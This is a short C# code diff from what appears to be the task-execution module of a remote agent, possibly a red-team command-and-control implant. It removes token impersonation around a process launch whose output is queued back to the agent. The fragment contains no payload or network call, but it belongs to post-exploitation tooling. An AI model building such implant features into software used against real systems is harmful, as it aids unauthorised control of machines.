@@ -69,10 +69,7 @@ namespace Tasks
                         proc.ErrorDataReceieved += DataReceived;
                         proc.Exit += Proc_Exit;
                         bool bRet = false;
-                        using (_agent.GetIdentityManager().GetCurrentImpersonationIdentity().Impersonate())
-                        {
-                            bRet = proc.Start();
-                        }    
+                        bRet = proc.Start();
                         if (!bRet)
                         {
                             _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
